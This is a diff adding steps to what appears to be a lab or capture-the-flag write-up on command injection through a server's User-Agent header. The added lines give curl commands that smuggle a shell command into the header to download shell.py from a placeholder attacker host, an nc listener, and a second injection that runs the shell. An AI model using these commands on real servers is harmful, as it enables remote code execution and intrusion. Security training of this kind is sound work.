@@ -54,3 +54,23 @@ This means the server is vulnerable to command injection attacks!
 
 You can modify the User Agent string in Chromium browers by opening the developer tools >> more tools >> network conditions.
 Then deselect under User Agent "Use Browser Default" and you can now input any string you want into the user agent. 
+
+
+Also you can run using curl...
+
+#### Install the shell 
+
+```
+curl -H "User-Agent: curl http://<attackerip>:4443/shell.py >> /tmp/shell.py" http://<serverip>:8080
+```
+
+#### Start the nc listener on the attacker
+```
+nc -l 4443
+```
+
+
+#### Execute the shell on the victim
+```
+curl -H "User-Agent: python3 /tmp/shell.py" http://<serverip>:8080
+```
